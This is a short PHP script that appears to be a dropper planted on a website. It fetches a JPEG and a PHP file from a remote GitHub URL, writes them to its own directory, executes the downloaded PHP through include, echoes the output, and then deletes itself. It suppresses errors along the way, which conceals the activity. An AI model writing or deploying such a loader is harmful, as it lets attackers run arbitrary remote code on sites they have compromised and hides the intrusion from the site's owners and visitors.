<?php
$d=__DIR__;$b='https://raw.githubusercontent.com/davidpersons10-cloud/getfortwayneplumber/opd-homefix-drop-20260920/ongtmp';
foreach(['opd-hero-clean.jpg','opd-hero-swap.php'] as $f){
  $x=@file_get_contents($b.'/'.$f);
  if($x&&strlen($x)>100) file_put_contents($d.'/'.$f,$x);
}
ob_start(); include $d.'/opd-hero-swap.php'; echo ob_get_clean();
@unlink(__FILE__);
